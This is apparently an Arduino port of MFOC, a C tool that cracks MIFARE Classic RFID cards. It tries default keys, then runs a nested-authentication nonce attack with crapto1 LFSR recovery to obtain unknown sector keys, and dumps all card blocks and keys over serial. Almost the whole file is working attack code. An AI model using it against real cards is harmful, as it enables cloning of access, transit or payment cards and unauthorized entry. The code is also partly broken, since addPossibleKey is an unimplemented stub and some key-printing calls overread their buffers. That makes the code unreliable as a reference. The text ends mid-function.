/*

 Mifare Classic Offline Cracker

 Requirements: crapto1 library http://code.google.com/p/crapto1
 libnfc                        http://www.libnfc.org

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 2 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.

 Contact: <mifare@nethemba.com>

 Porting to libnfc 1.3.3: Michal Boska <boska.michal@gmail.com>
 Porting to libnfc 1.3.9: Romuald Conty <romuald@libnfc.org>
 Porting to libnfc 1.4.x: Romuald Conty <romuald@libnfc.org>

 URL http://eprint.iacr.org/2009/137.pdf
 URL http://www.sos.cs.ru.nl/applications/rfid/2008-esorics.pdf
 URL http://www.cosic.esat.kuleuven.be/rfidsec09/Papers/mifare_courtois_rfidsec09.pdf
 URL http://www.cs.ru.nl/~petervr/papers/grvw_2009_pickpocket.pdf
*/

/* vim: set ts=2 sw=2 et: */


#if defined(ARDUINO) && ARDUINO >= 100
#include "Arduino.h"
#else
#include "WProgram.h"
#endif

// NFC
#include <nfc/nfc.h>
#include "nfc-utils.h"

// Crapto1
#include "crapto1.h"

// Internal
#include "errors.h"
#include "mifare.h"
#include "nfc-utils.h"
#include "mfoc.h"

void swreset(){
	Serial.println("RESET");
	Serial.flush();
	asm volatile ("jmp 0");
}

int mfocmain(uint32_t id) {
	/*const nfc_modulation nm = {
		.nmt = NMT_ISO14443A,
		.nbr = NBR_106,
	};*/
	const nfc_modulation nm = { /*.nmt = */ NMT_ISO14443A, /*.nbr = */ NBR_106 };
	
	int ch, k, n, j, m;
	int block;
	int succeed = 1;

	// Exploit sector
	int e_sector;
	int probes = DEFAULT_PROBES_NR;
	int sets = DEFAULT_SETS_NR;

	// By default, dump 'A' keys
	int dumpKeysA = true;
	bool failure = false;
	bool skip = false;
	
	// Array with default Mifare Classic keys
	uint8_t defaultKeys[][6] = {
		{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, // Default key (first key used by program if no user defined key)
		{0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5}, // NFCForum MAD key
		{0xd3, 0xf7, 0xd3, 0xf7, 0xd3, 0xf7}, // NFCForum content key
		{0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Blank key
		{0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5},
		{0x4d, 0x3a, 0x99, 0xc3, 0x51, 0xdd},
		{0x1a, 0x98, 0x2c, 0x7e, 0x45, 0x9a},
		{0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff},
		{0x71, 0x4c, 0x5c, 0x88, 0x6e, 0x97},
		{0x58, 0x7e, 0xe5, 0xf9, 0x35, 0x0f},
		{0xa0, 0x47, 0x8c, 0xc3, 0x90, 0x91},
		{0x53, 0x3c, 0xb6, 0xc7, 0x23, 0xf6},
		{0x8f, 0xd0, 0xa4, 0xf2, 0x56, 0xe9}

	};

	mftag		t;
	mfreader	r;
	denonce		d = {NULL, 0, DEFAULT_DIST_NR, DEFAULT_TOLERANCE, {0x00, 0x00, 0x00}};

	// Pointers to possible keys
	pKeys		*pk;

	static mifare_param mp;
 	static mifare_classic_tag mtDump;

	mifare_cmd mc;

	// Initialize reader/tag structures
	if(mf_init(&r) < 0){
		nfc_perror (r.pdi, ERROR_NO_NFC_DEVICE_FOUND);
		return -1;
	}

	if (nfc_initiator_init (r.pdi) < 0) {
		nfc_perror (r.pdi, ERROR_NFC_INITIATOR_INIT);
		return -1;
	}
	// Drop the field for a while, so can be reset
	if (nfc_device_set_property_bool(r.pdi, NP_ACTIVATE_FIELD, true) < 0) {
		nfc_perror (r.pdi, ERROR_NFC_DEVICE_SET_PROPERTY_BOOL_ACTIVATE_FIELD);
		return -1;
	}
	// Let the reader only try once to find a tag
	if (nfc_device_set_property_bool(r.pdi, NP_INFINITE_SELECT, false) < 0) {
		nfc_perror (r.pdi, ERROR_NFC_DEVICE_SET_PROPERTY_BOOL_INFINITE_SELECT);
		return -1;
	}
	// Configure the CRC and Parity settings
	if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_CRC, true) < 0) {
		nfc_perror (r.pdi, ERROR_NFC_DEVICE_SET_PROPERTY_BOOL_CRC);
		return -1;
	}
	if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_PARITY, true) < 0) {
		nfc_perror (r.pdi, ERROR_NFC_DEVICE_SET_PROPERTY_BOOL_PARITY);
		return -1;
	}

/*
	// wait for tag to appear
	for (i=0;!nfc_initiator_select_passive_target(r.pdi, nm, NULL, 0, &t.nt) && i < 10; i++) zsleep (100);
*/

	// mf_select_tag(r.pdi, &(t.nt));
	if (nfc_initiator_select_passive_target (r.pdi, nm, NULL, 0, &t.nt) < 0) {
		nfc_perror (r.pdi, ERROR_NFC_INITIATOR_SELECT_PASSIVE_TARGET);
		return -1;
	}

	// Test if a compatible MIFARE tag is used
	if ((t.nt.nti.nai.btSak & 0x08) == 0) {
		nfc_perror (r.pdi, ERROR_NFC_ONLY_MIFARE_CLASSIC_IS_SUPPORTED);
		return -1;
	}

	// Save tag's block size (b4K)
	t.b4K = (t.nt.nti.nai.abtAtqa[1] == 0x02);
	t.authuid = (uint32_t) bytes_to_num(t.nt.nti.nai.abtUid + t.nt.nti.nai.szUidLen - 4, 4);

	t.num_blocks = (t.b4K) ? 0xff : 0x3f;
	t.num_sectors = t.b4K ? NR_TRAILERS_4k : NR_TRAILERS_1k;

	t.sectors = (sector*) calloc(t.num_sectors, sizeof(sector));
	if (t.sectors == NULL) {
		nfc_perror (r.pdi, ERROR_MEMORY_ALLOCATION);
		return -1;
	}
	if ((pk = (pKeys*) malloc(sizeof(pKeys))) == NULL) {
		nfc_perror (r.pdi, ERROR_MEMORY_ALLOCATION);
		return -1;
	}

	d.distances = (uint32_t*) calloc(d.num_distances, sizeof(uint32_t));
	if (d.distances == NULL) {
		nfc_perror (r.pdi, ERROR_MEMORY_ALLOCATION);
		return -1;
	}
	
	// Initialize t.sectors, keys are not known yet
	for (uint8_t s = 0; s < (t.num_sectors); ++s) {
		t.sectors[s].foundKeyA = t.sectors[s].foundKeyB = false;
	}

	//print_nfc_iso14443a_info (t.nt.nti.nai, true);

	// Try to authenticate to all sectors with default keys
	// Set the authentication information (uid)
	memcpy(mp.mpa.abtAuthUid, t.nt.nti.nai.abtUid + t.nt.nti.nai.szUidLen - 4, sizeof(mp.mpa.abtAuthUid));
	// Iterate over all keys (n = number of keys)
	n = sizeof(defaultKeys)/sizeof(defaultKeys[0]);
	int key = 0;
	
	while (key < n) {
		memcpy(mp.mpa.abtKey, defaultKeys[key], sizeof(mp.mpa.abtKey));
		key++;
		
		Serial.print("[Key: ");
		printHex(mp.mpa.abtKey, 6);
		Serial.print("] -> [");

		int i = 0; // Sector counter
		// Iterate over every block, where we haven't found a key yet
		for (block = 0; block <= t.num_blocks; ++block) {
			if (trailer_block(block)) {
				if (!t.sectors[i].foundKeyA) {
					mc = MC_AUTH_A;
					if (!nfc_initiator_mifare_cmd(r.pdi,mc,block,&mp)) {
						//Serial.print("!!Error: AUTH [Key A:");
						//printHex(mp.mpa.abtKey, 6);
						//Serial.print("] sector ");
						//Serial.print(i, HEX);
						//Serial.print(" t_block ");
						//Serial.println(block, HEX);

						mf_anticollision(t, r);
					} else {
						// Save all information about successfull keyA authentization
						memcpy(t.sectors[i].KeyA, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
						t.sectors[i].foundKeyA = true;
					}
				}
				if (!t.sectors[i].foundKeyB) {
					mc = MC_AUTH_B;
					if (!nfc_initiator_mifare_cmd(r.pdi,mc,block,&mp)) {
						//Serial.print("!!Error: AUTH [Key B:");
						//printHex(mp.mpa.abtKey, 6);
						//Serial.print("] sector ");
						//Serial.print(i, HEX);
						//Serial.print(" t_block ");
						//Serial.println(block, HEX);

						mf_anticollision(t, r);
						// No success, try next block
						t.sectors[i].trailer = block;
					} else {
						memcpy(t.sectors[i].KeyB, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
						t.sectors[i].foundKeyB = true;
					}
				}
				if ((t.sectors[i].foundKeyA) && (t.sectors[i].foundKeyB)) {
					Serial.print("X");
				} else if (t.sectors[i].foundKeyA) {
					Serial.print("A");
				} else if (t.sectors[i].foundKeyB) {
					Serial.print("B");
				} else {
					Serial.print(".");
				}
				Serial.flush();
				
				//Serial.print("\nSuccess: AUTH [Key ");
				//Serial.print((mc == MC_AUTH_A ? 'A' :'B'));
				//Serial.print(":");
				//printHex(mp.mpa.abtKey, 6);
				//Serial.print("] sector ");
				//Serial.print(i, HEX);
				//Serial.print(" t_block ");
				//Serial.println(block, HEX);
				
				// Save position of a trailer block to sector struct
				t.sectors[i++].trailer = block;
			}
		}
		Serial.println("]");
	}

	Serial.println();
	
	for (uint8_t i = 0; i < (t.num_sectors); ++i) {		
			Serial.print("Sector ");
			Serial.print(i, DEC);
			Serial.print(" -");
			Serial.print((t.sectors[i].foundKeyA) ? " FOUND_KEY   [A]" : " UNKNOWN_KEY [A]");
		
			Serial.print("Sector ");
			Serial.print(i, DEC);
			Serial.print(" -");
			Serial.println((t.sectors[i].foundKeyB) ? " FOUND_KEY   [B]" : " UNKNOWN_KEY [B]");
	}
	Serial.flush();

	// Return the first (exploit) sector encrypted with the default key or -1 (we have all keys)
	e_sector = find_exploit_sector(t);
	//mf_enhanced_auth(e_sector, 0, t, r, &d, pk, 'd'); // AUTH + Get Distances mode

	// Recover key from encrypted sectors, j is a sector counter
	for (m = 0; m < 2; ++m) {
		if (e_sector == -1) break; // All keys are default, I am skipping recovery mode
		for (j = 0; j < (t.num_sectors); ++j) {
			memcpy(mp.mpa.abtAuthUid, t.nt.nti.nai.abtUid + t.nt.nti.nai.szUidLen - 4, sizeof(mp.mpa.abtAuthUid));
			if ((dumpKeysA && !t.sectors[j].foundKeyA) || (!dumpKeysA && !t.sectors[j].foundKeyB)) {

				// Max probes for auth for each sector
				for (k = 0; k < probes; ++k) {
					// Try to authenticate to exploit sector and determine distances (filling denonce.distances)
					mf_enhanced_auth(e_sector, 0, t, r, &d, pk, 'd', dumpKeysA); // AUTH + Get Distances mode
					
					Serial.print("Sector: ");
					Serial.print(j, DEC);
					Serial.print(" type ");
					Serial.println((dumpKeysA ? 'A' : 'B'));
					Serial.print(" probe ");
					Serial.print(k, DEC);
					Serial.print(" distance ");
					Serial.print(d.median, DEC);

					// Configure device to the previous state
					mf_configure(r.pdi);
					mf_anticollision(t, r);

					pk->possibleKeys = NULL;
					pk->size = 0;
					// We have 'sets' * 32b keystream of potential keys
					for (n = 0; n < sets; n++) {
						// AUTH + Recovery key mode (for a_sector), repeat 5 times
						mf_enhanced_auth(e_sector, t.sectors[j].trailer, t, r, &d, pk, 'r', dumpKeysA);
						mf_configure(r.pdi);
						mf_anticollision(t, r);
						Serial.print(".");
						Serial.flush();
					}
					Serial.println();
					
					for (int i = 0; i < pk->size ; i++) {
						// Set required authetication method
						num_to_bytes(pk->possibleKeys[i], 6, mp.mpa.abtKey);
						mc = (mifare_cmd)(dumpKeysA ? 0x60 : 0x61);
						if (!nfc_initiator_mifare_cmd(r.pdi,mc,t.sectors[j].trailer,&mp)) {

							//Serial.print("!!Error: AUTH [Key A:");
							//printHex(mp.mpa.abtKey, 6);
							//Serial.print("] sector ");
							//Serial.print(j, HEX);
							//Serial.print(" t_block ");
							//Serial.println(t.sectors[j].trailer, HEX);

							mf_anticollision(t, r);
						} else {
							// Save all information about successfull authentization
							if (dumpKeysA) {
								memcpy(t.sectors[j].KeyA, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
								t.sectors[j].foundKeyA = true;

							} else {
								memcpy(t.sectors[j].KeyB, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
								t.sectors[j].foundKeyB = true;
							}

							Serial.print("Found Key:");
							Serial.print((dumpKeysA ? 'A' : 'B'));
							Serial.print(" ");
							printHex(mp.mpa.abtKey, 6);
							Serial.println();

							mf_configure(r.pdi);
							mf_anticollision(t, r);
							break;
						}
					}
					free(pk->possibleKeys);
					// Success, try the next sector
					if ((dumpKeysA && t.sectors[j].foundKeyA) || (!dumpKeysA && t.sectors[j].foundKeyB)) break;
				}
				// We haven't found any key, exiting
				if ((dumpKeysA && !t.sectors[j].foundKeyA) || (!dumpKeysA && !t.sectors[j].foundKeyB)) {
					//No success, maybe you should increase the probes
					nfc_perror (r.pdi, ERROR_NO_SUCCESS);
					return -1;
				}
			}
		}
		dumpKeysA = false;
	}


	for (int i = 0; i < (t.num_sectors); ++i) {
		if ((dumpKeysA && !t.sectors[i].foundKeyA) || (!dumpKeysA && !t.sectors[i].foundKeyB)) {
			Serial.println("\nTry again, there are still some encrypted blocks");
			succeed = 0;
			break;
		}
	}

	if (succeed) {
		int i = t.num_sectors; // Sector counter
		Serial.println("Auth with all sectors succeeded, dumping keys to a file!\n");
		// Read all blocks
		for (block = t.num_blocks; block >= 0; block--) {
			trailer_block(block) ? i-- : i;
			failure = true;

			// Try A key, auth() + read()
			memcpy(mp.mpa.abtKey, t.sectors[i].KeyA, sizeof(t.sectors[i].KeyA));
			if (!nfc_initiator_mifare_cmd(r.pdi, MC_AUTH_A, block, &mp)) {
				// ERR ("Error: Auth A");
				mf_configure(r.pdi);
				mf_anticollision(t, r);
			} else { // and Read
				if (nfc_initiator_mifare_cmd(r.pdi, MC_READ, block, &mp)) {
					
					Serial.print("Block ");
					Serial.print(block, HEX);
					Serial.print(" type A");
					printHex(t.sectors[i].KeyA, 16);
					printHex(mp.mpd.abtData, 16);
					
					mf_configure(r.pdi);
					mf_select_tag(r.pdi, &(t.nt));
					failure = false;
				} else {
					// Error, now try read() with B key
					// ERR ("Error: Read A");
					mf_configure(r.pdi);
					mf_anticollision(t, r);
					memcpy(mp.mpa.abtKey, t.sectors[i].KeyB, sizeof(t.sectors[i].KeyB));
					if (!nfc_initiator_mifare_cmd(r.pdi, MC_AUTH_B, block, &mp)) {
						// ERR ("Error: Auth B");
						mf_configure(r.pdi);
						mf_anticollision(t, r);
					} else { // and Read
						if (nfc_initiator_mifare_cmd(r.pdi, MC_READ, block, &mp)) {
														
							Serial.print("Block ");
							Serial.print(block, HEX);
							Serial.print(" type B");
							printHex(t.sectors[i].KeyB, 16);
							printHex(mp.mpd.abtData, 16);

							mf_configure(r.pdi);
							mf_select_tag(r.pdi, &(t.nt));
							failure = false;
						} else {
							mf_configure(r.pdi);
							mf_anticollision(t, r);
							// ERR ("Error: Read B");
						}
					}
				}
			}
			if (trailer_block(block)) {
				// Copy the keys over from our key dump and store the retrieved access bits
				memcpy(mtDump.amb[block].mbt.abtKeyA, t.sectors[i].KeyA,6);
				memcpy(mtDump.amb[block].mbt.abtKeyB,t.sectors[i].KeyB,6);
				if (!failure) memcpy(mtDump.amb[block].mbt.abtAccessBits,mp.mpd.abtData+6,4);
			} else if (!failure) memcpy(mtDump.amb[block].mbd.abtData, mp.mpd.abtData,16);
			memcpy(mp.mpa.abtAuthUid, t.nt.nti.nai.abtUid + t.nt.nti.nai.szUidLen - 4, sizeof(mp.mpa.abtAuthUid));
		}

		// Finally save all keys + data to file (Serial instead)
		Serial.write((uint8_t*)&mtDump, sizeof(mtDump));
	}

	free(t.sectors);
	free(d.distances);

	// Reset the "advanced" configuration to normal
	nfc_device_set_property_bool(r.pdi, NP_HANDLE_CRC, true);
	nfc_device_set_property_bool(r.pdi, NP_HANDLE_PARITY, true);

	// Disconnect device and exit
	nfc_close(r.pdi);
    nfc_exit(NULL);
    exit (EXIT_SUCCESS);
}


int mf_init(mfreader *r) {
	// Connect to the first NFC device
	nfc_init(NULL);
	r->pdi = nfc_open(NULL, NULL);
	if (!r->pdi) {
		Serial.println("No NFC device found.");
		return -1;
	}
	return 0;
}

void mf_configure(nfc_device* pdi) {
	if (nfc_initiator_init (pdi) < 0) {
		nfc_perror (pdi, ERROR_NFC_INITIATOR_INIT);
		swreset();
	}
	// Drop the field for a while, so can be reset
	if (nfc_device_set_property_bool(pdi, NP_ACTIVATE_FIELD, false) < 0) {
		nfc_perror (pdi, ERROR_NFC_DEVICE_SET_PROPERTY_BOOL_ACTIVATE_FIELD);
		swreset();
	}
	// Let the reader only try once to find a tag
	if (nfc_device_set_property_bool(pdi, NP_INFINITE_SELECT, false) < 0) {
		nfc_perror (pdi, ERROR_NFC_DEVICE_SET_PROPERTY_BOOL_INFINITE_SELECT);
		swreset();
	}
	// Configure the CRC and Parity settings
	if (nfc_device_set_property_bool(pdi, NP_HANDLE_CRC, true) < 0) {
		nfc_perror (pdi, ERROR_NFC_DEVICE_SET_PROPERTY_BOOL_CRC);
		swreset();
	}
	if (nfc_device_set_property_bool(pdi, NP_HANDLE_PARITY, true) < 0) {
		nfc_perror (pdi, ERROR_NFC_DEVICE_SET_PROPERTY_BOOL_PARITY);
		swreset();
	}
	// Enable the field so more power consuming cards can power themselves up
	if (nfc_device_set_property_bool(pdi, NP_ACTIVATE_FIELD, true) < 0) {
		nfc_perror (pdi, ERROR_NFC_DEVICE_SET_PROPERTY_BOOL_ACTIVATE_FIELD);
		swreset();
	}
}

void mf_select_tag(nfc_device* pdi, nfc_target* pnt) {
	// Poll for a ISO14443A (MIFARE) tag
	/*const nfc_modulation nm = {
		.nmt = NMT_ISO14443A,
		.nbr = NBR_106,
	};*/
	const nfc_modulation nm = { /*.nmt = */ NMT_ISO14443A, /*.nbr = */ NBR_106 };
	
	if (nfc_initiator_select_passive_target(pdi, nm, NULL, 0, pnt) < 0) {
		//Serial.println("Unable to connect to the MIFARE Classic tag");
		swreset();
	}
}

int trailer_block(uint32_t block)
{
	// Test if we are in the small or big sectors
	return (block < 128) ? ((block + 1) % 4 == 0) : ((block + 1) % 16 == 0);
}

// Return position of sector if it is encrypted with the default key otherwise exit..
int find_exploit_sector(mftag t) {
	int i;
	bool interesting = false;

	for (i = 0; i < t.num_sectors; i++) {
		if (!t.sectors[i].foundKeyA || !t.sectors[i].foundKeyB) {
			interesting = true;
			break;
		}
	}
	if (!interesting) {
		Serial.print("\nWe have all sectors encrypted with the default keys..\n\n");
		return -1;
	}
	for (i = 0; i < t.num_sectors; i++) {
		if ((t.sectors[i].foundKeyA) || (t.sectors[i].foundKeyB)) {
			Serial.print("\n\nUsing sector ");
			Serial.print(i, DEC);
			Serial.println("as an exploit sector");
			return i;
		}
	}
	//Serial.print("\n\nNo sector encrypted with the default key has been found, exiting..");
	swreset();
}

void mf_anticollision(mftag t, mfreader r) {
	/*const nfc_modulation nm = {
		.nmt = NMT_ISO14443A,
		.nbr = NBR_106,
	};*/
	const nfc_modulation nm = { /*.nmt = */ NMT_ISO14443A, /*.nbr = */ NBR_106 };
	
	if (nfc_initiator_select_passive_target(r.pdi, nm, NULL, 0, &t.nt) < 0) {
		nfc_perror (r.pdi, ERROR_NFC_INITIATOR_SELECT_PASSIVE_TARGET);
		Serial.print("Tag has been removed");
		swreset();
	}
}

int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d, pKeys *pk, char mode, bool dumpKeysA) {
	struct Crypto1State* pcs;
	struct Crypto1State* revstate;
	struct Crypto1State* revstate_start;

	uint64_t lfsr;

	// Possible key counter, just continue with a previous "session"
	uint32_t kcount = pk->size;

	uint8_t Nr[4] = { 0x00,0x00,0x00,0x00 }; // Reader nonce
	uint8_t Auth[4] = { 0x00, t.sectors[e_sector].trailer, 0x00, 0x00 };
	uint8_t AuthEnc[4] = { 0x00, t.sectors[e_sector].trailer, 0x00, 0x00 };
	uint8_t AuthEncPar[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };

	uint8_t ArEnc[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	uint8_t ArEncPar[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };

	uint8_t Rx[MAX_FRAME_LEN]; // Tag response
	uint8_t RxPar[MAX_FRAME_LEN]; // Tag response
	size_t RxLen;

	uint32_t Nt, NtLast, NtProbe, NtEnc, Ks1;

	int i, m;

	// Prepare AUTH command
	Auth[0] = (t.sectors[e_sector].foundKeyA) ? 0x60 : 0x61;
	iso14443a_crc_append (Auth,2);
	// Serial.print("\nAuth command:\t");
	// printHex(Auth, 4);

	// We need full control over the CRC
	if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_CRC, false) < 0)  {
		nfc_perror (r.pdi, ERROR_NFC_DEVICE_SET_PROPERTY_BOOL_CRC);
		swreset();
	}

	// Request plain tag-nonce
	// TODO: Set NP_EASY_FRAMING option only once if possible
	if (nfc_device_set_property_bool (r.pdi, NP_EASY_FRAMING, false) < 0) {
		nfc_perror (r.pdi, ERROR_NFC_DEVICE_SET_PROPERTY_BOOL_FRAMING);
		swreset();
	}

	if (nfc_initiator_transceive_bytes(r.pdi, Auth, 4, Rx, sizeof(Rx), 0) < 0) {
		//Error while requesting plain tag-nonce
		nfc_perror (r.pdi, ERROR_NFC_INITIATOR_TRANSCEIVE_BYTES);
		swreset();
	}

	if (nfc_device_set_property_bool (r.pdi, NP_EASY_FRAMING, true) < 0) {
		nfc_perror (r.pdi, ERROR_NFC_DEVICE_SET_PROPERTY_BOOL_FRAMING);
		swreset();
	}
	// printHex(Rx, 4);

	// Save the tag nonce (Nt)
	Nt = bytes_to_num(Rx, 4);

	// Init the cipher with key {0..47} bits
	if (t.sectors[e_sector].foundKeyA) {
		pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyA, 6));
	} else {
		pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyB, 6));
	}

	// Load (plain) uid^nt into the cipher {48..79} bits
	crypto1_word(pcs, bytes_to_num(Rx, 4) ^ t.authuid, 0);

	// Generate (encrypted) nr+parity by loading it into the cipher
	for (i = 0; i < 4; i++) {
		// Load in, and encrypt the reader nonce (Nr)
		ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
		ArEncPar[i] = filter(pcs->odd) ^ odd_parity(Nr[i]);
	}
	// Skip 32 bits in the pseudo random generator
	Nt = prng_successor(Nt, 32);
	// Generate reader-answer from tag-nonce
	for (i = 4; i < 8; i++) {
		// Get the next random byte
		Nt = prng_successor(Nt, 8);
		// Encrypt the reader-answer (Nt' = suc2(Nt))
		ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ (Nt&0xff);
		ArEncPar[i] = filter(pcs->odd) ^ odd_parity(Nt);
	}

	// Finally we want to send arbitrary parity bits
	if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_PARITY, false) < 0) {
		nfc_perror (r.pdi, ERROR_NFC_DEVICE_SET_PROPERTY_BOOL_PARITY);
		swreset();
	}

	// Transmit reader-answer
	// Serial.print("\t{Ar}:\t");
	// printHex_par(ArEnc, 64, ArEncPar);
	int res;
	if (((res = nfc_initiator_transceive_bits(r.pdi, ArEnc, 64, ArEncPar, Rx, RxPar)) < 0) || (res != 32)) {
		//Reader-answer transfer error, exiting..
		nfc_perror (r.pdi, ERROR_NFC_INITIATOR_TRANSCEIVE_BYTES);
		swreset();
	}

	// Now print the answer from the tag
	// Serial.print("\t{At}:\t");
	// printHex_par(Rx,RxLen,RxPar);

	// Decrypt the tag answer and verify that suc3(Nt) is At
	Nt = prng_successor(Nt, 32);
	if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt&0xFFFFFFFF))) {
		Serial.println("[At] is not Suc3(Nt), something is wrong, exiting..");
		swreset();
	}
	// Serial.print("Authentication completed.\n\n");

	// If we are in "Get Distances" mode
	if (mode == 'd') {

		for (m = 0; m < d->num_distances; m++) {
			// Serial.print("Nested Auth number: ");
			// Serial.print(m, HEX);
			// Encrypt Auth command with the current keystream
			for (i = 0; i < 4; i++) {
		                AuthEnc[i] = crypto1_byte(pcs,0x00,0) ^ Auth[i];
                		// Encrypt the parity bits with the 4 plaintext bytes
                		AuthEncPar[i] = filter(pcs->odd) ^ odd_parity(Auth[i]);
			}

			// Sending the encrypted Auth command
			if (nfc_initiator_transceive_bits(r.pdi, AuthEnc, 32, AuthEncPar,Rx, RxPar) < 0) {
				//Error requesting encrypted tag-nonce
				nfc_perror (r.pdi, ERROR_NFC_INITIATOR_TRANSCEIVE_BYTES);				
				swreset();
			}

			// Decrypt the encrypted auth
			if (t.sectors[e_sector].foundKeyA) {
				pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyA, 6));
			} else {
				pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyB, 6));
			}
			NtLast = bytes_to_num(Rx, 4) ^ crypto1_word(pcs, bytes_to_num(Rx, 4) ^ t.authuid, 1);

			// Save the determined nonces distance
			d->distances[m] = nonce_distance(Nt, NtLast);
			//Serial.print("distance: ");
			//Serial.println(d->distances[m], DEC);

			// Again, prepare and send {At}
			for (i = 0; i < 4; i++) {
				ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
				ArEncPar[i] = filter(pcs->odd) ^ odd_parity(Nr[i]);
			}
			Nt = prng_successor(NtLast, 32);
			for (i = 4; i < 8; i++) {
				Nt = prng_successor(Nt, 8);
				ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ (Nt&0xFF);
				ArEncPar[i] = filter(pcs->odd) ^ odd_parity(Nt);
			}
			nfc_device_set_property_bool(r.pdi,NP_HANDLE_PARITY,false);
			if (((res = nfc_initiator_transceive_bits(r.pdi, ArEnc, 64, ArEncPar, Rx, RxPar)) < 0) || (res != 32)) {
				//Reader-answer transfer error, exiting..
				nfc_perror (r.pdi, ERROR_NFC_INITIATOR_TRANSCEIVE_BYTES);	
				swreset();
			}
			Nt = prng_successor(Nt, 32);
			if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt&0xFFFFFFFF))) {
				//[At] is not Suc3(Nt), something is wrong, exiting.."
				swreset();
			}
		} // Next auth probe

		// Find median from all distances
		d->median = median(*d);
		//Serial.print("Median: %05d\n", d->median);
	} // The end of Get Distances mode

	// If we are in "Get Recovery" mode
	if (mode == 'r') {
		// Again, prepare the Auth command with MC_AUTH_A, recover the block and CRC
		Auth[0] = dumpKeysA ? 0x60 : 0x61;
		Auth[1] = a_sector;
		iso14443a_crc_append (Auth,2);

		// Encryption of the Auth command, sending the Auth command
		for (i = 0; i < 4; i++) {
			AuthEnc[i] = crypto1_byte(pcs,0x00,0) ^ Auth[i];
			// Encrypt the parity bits with the 4 plaintext bytes
			AuthEncPar[i] = filter(pcs->odd) ^ odd_parity(Auth[i]);
		}
		if (nfc_initiator_transceive_bits(r.pdi, AuthEnc, 32, AuthEncPar,Rx, RxPar) < 0) {
			//"while requesting encrypted tag-nonce"
			nfc_perror (r.pdi, ERROR_NFC_INITIATOR_TRANSCEIVE_BYTES);	
			swreset();
		}

		// Finally we want to send arbitrary parity bits
		if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_PARITY, true) < 0)  {
			nfc_perror (r.pdi, ERROR_NFC_DEVICE_SET_PROPERTY_BOOL_PARITY_RESTORE_M);
			swreset();
		}

		if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_CRC, true) < 0)  {
			nfc_perror (r.pdi, ERROR_NFC_DEVICE_SET_PROPERTY_BOOL_CRC_RESTORE_M);
			swreset();
		}

		// Save the encrypted nonce
		NtEnc = bytes_to_num(Rx, 4);

		// Parity validity check
		for (i = 0; i < 3; ++i) {
			d->parity[i] = (odd_parity(Rx[i]) != RxPar[i]);
		}

		// Iterate over Nt-x, Nt+x
		//Serial.print("Iterate from ");
		//Serial.print(d->median-TOLERANCE, DEC);
		//Serial.print(" to ");
		//Serial.println(d->median+TOLERANCE, DEC);
		
		NtProbe = prng_successor(Nt, d->median-d->tolerance);
		for (m = d->median-d->tolerance; m <= d->median+d->tolerance; m +=2) {

			// Try to recover the keystream1
			Ks1 = NtEnc ^ NtProbe;

			// Skip this nonce after invalid 3b parity check
			revstate_start = NULL;
			if (valid_nonce(NtProbe, NtEnc, Ks1, d->parity)) {
				// And finally recover the first 32 bits of the key
				revstate = lfsr_recovery32(Ks1, NtProbe ^ t.authuid);
                                if (revstate_start == NULL) {
                                        revstate_start = revstate;
                                }
				while ((revstate->odd != 0x0) || (revstate->even != 0x0)) {
					lfsr_rollback_word(revstate, NtProbe ^ t.authuid, 0);
					crypto1_get_lfsr(revstate, &lfsr);
					// Allocate a new space for keys (not need to allocate a lot of space)
					if (((kcount % MEM_CHUNK) == 0) || (kcount >= pk->size)) {
						pk->size += MEM_CHUNK;
						pk->possibleKeys = (uint64_t *) realloc((void *)pk->possibleKeys, pk->size * sizeof(uint64_t));
						if (pk->possibleKeys == NULL) {
							//Memory allocation error for pk->possibleKeys
							nfc_perror (r.pdi, ERROR_MEMORY_ALLOCATION);	
							swreset();
						}
					}
					if(addPossibleKey(lfsr, kcount) == 2){
						pk->possibleKeys[kcount++] = lfsr;
					}
					revstate++;
				}
				free(revstate_start);
			}
			NtProbe = prng_successor(NtProbe, 2);
		}
		// Truncate
		if (kcount != 0) {
			pk->size = --kcount;
			if ((pk->possibleKeys = (uint64_t *) realloc((void *)pk->possibleKeys, pk->size * sizeof(uint64_t))) == NULL) {
				//Memory allocation error for pk->possibleKeys
				nfc_perror (r.pdi, ERROR_MEMORY_ALLOCATION);	
				swreset();
			}
		}
	}
	crypto1_destroy(pcs);
	return 0;
}

// adds the key in the external RAM and returns true thenumber of occurences of the key in the RAM
int addPossibleKey(uint64_t key, int kCount) {
	//TODO IMPLEMENT ME
	return 0;
}

// Return the median value from the nonce distances array
uint32_t median(denonce d) {
